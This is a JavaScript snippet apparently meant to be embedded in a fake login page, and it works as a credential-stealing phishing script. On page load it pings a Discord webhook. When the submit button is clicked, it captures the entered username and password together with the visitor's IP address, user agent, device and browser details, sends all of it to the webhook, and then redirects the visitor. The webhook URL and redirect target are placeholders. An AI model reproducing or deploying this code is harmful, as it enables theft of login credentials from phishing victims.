<script>
    const form = document.querySelector('form');
        const webhookUrl = 'Your Discord Webhook URL';

        function alertM() {
            const data = {
                content: 'ALERT SOMEONE IS INSIDE!'
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });
        }

        window.addEventListener('load', () => {
            alertM();
        });

        const loginButton = document.querySelector('#sumbit22');
        loginButton.addEventListener('click', (event) => {
            event.preventDefault();

            const username = document.querySelector('#input28').value;
            const password = document.querySelector('#input36').value;
            const ipAddress = form.getAttribute('data-ip');
            const userAgent = navigator.userAgent;
            const deviceInfo = `Device: ${navigator.vendor} ${navigator.product}`;
            const timestamp = new Date().toISOString();
            const browserInfo = `Browser: ${navigator.appName} ${navigator.appVersion}, Platform: ${navigator.platform}`;


            const data = {
    content: `
**Username:** ${username}  
**Password:** ${password}  
**IP Address:** ${ipAddress}  
**User Agent:** ${userAgent}  
**Device Info:** ${deviceInfo}
**Timestamp:** ${timestamp}
**Browser Info:** ${browserInfo}
    `
};

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                } else {
                    window.location.href = "A picture you want after the sumbit button is clicked (URL HERE)";
                }
            })
            .catch(error => {
                console.error('There was a problem sending the data:', error);
            });
        });

        fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ipAddress = data.ip;
            form.setAttribute('data-ip', ipAddress);
        })
        .catch(error => {
            console.error('There was a problem getting the IP address:', error);
        });
    </script>
